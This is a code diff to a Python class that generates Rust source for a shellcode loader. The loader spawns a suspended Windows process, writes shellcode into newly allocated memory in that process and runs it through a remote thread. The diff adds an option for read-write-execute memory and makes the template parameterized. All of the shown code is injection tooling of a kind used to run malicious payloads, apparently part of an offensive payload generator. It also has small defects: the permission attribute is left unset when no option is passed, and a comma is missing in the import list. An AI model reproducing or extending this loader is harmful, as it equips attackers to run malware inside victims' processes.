@@ -1,4 +1,10 @@
 class spawnandinject:
+    def __init__(self, arguments):
+        if 'perm' in arguments:
+            if arguments['perm'] == 'rwx':
+                self.memoryPermission = 'PAGE_EXECUTE_READWRITE'
+            else:
+                self.memoryPermission = 'PAGE_EXECUTE_READ'
 
     def imports(self) -> list[str]:
         return ['extern crate windows_sys;', 
@@ -11,6 +17,7 @@ class spawnandinject:
                 'use windows_sys::Win32::System::Threading::PROCESS_INFORMATION;',
                 'use windows_sys::Win32::System::Threading::CREATE_SUSPENDED;',
                 'use windows_sys::Win32::System::Memory::PAGE_EXECUTE_READ;',
+                'use windows_sys::Win32::System::Memory::PAGE_EXECUTE_READWRITE;',
                 'use windows_sys::Win32::System::Threading::CreateRemoteThread;',
                 'use windows_sys::Win32::System::Threading::WaitForSingleObject;'
                 'use std::ffi::CString;',
@@ -21,8 +28,8 @@ class spawnandinject:
     def compilerOptions(self) -> list[str]:
         return ['windows-sys = { version = "0.61.2", features = ["Win32_System_Memory", "Win32_System_Threading", "Win32_Security", "Win32_Foundation", "Win32_System_Diagnostics_Debug", "Win32_System_Kernel", "Wdk_System", "Wdk_System_Threading"] }']
 
-    def template(self) -> str:
-        return """
+    def template(self, imports, codeblocks, transformers, shellcodeSize) -> str:
+        return f"""
 {imports}
 
 {codeblocks}
@@ -65,7 +72,7 @@ fn main() {{
             std::ptr::null(), 
             shellcode.len() as usize, 
             MEM_COMMIT | MEM_RESERVE, 
-            PAGE_EXECUTE_READ);
+            {self.memoryPermission});
 
         let _ = WriteProcessMemory(
             (lpprocessinformation).hProcess, 
